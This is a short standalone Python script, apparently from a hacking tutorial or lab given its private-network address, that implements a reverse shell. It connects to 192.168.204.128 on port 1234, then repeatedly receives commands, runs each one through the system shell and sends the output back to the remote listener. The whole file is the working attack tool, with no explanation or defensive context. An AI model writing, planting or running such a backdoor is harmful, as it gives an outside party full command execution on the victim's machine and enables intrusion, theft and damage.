#!/usr/bin/env python3

import socket
import subprocess

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.204.128", 1234))

connection.send(bytes("\n[+] Connection established.\n", "utf-8"))

while True:
    command = connection.recv(1024)
    command = command.decode()
    command_result = execute_system_command(command)
    connection.send(command_result)

connection.close()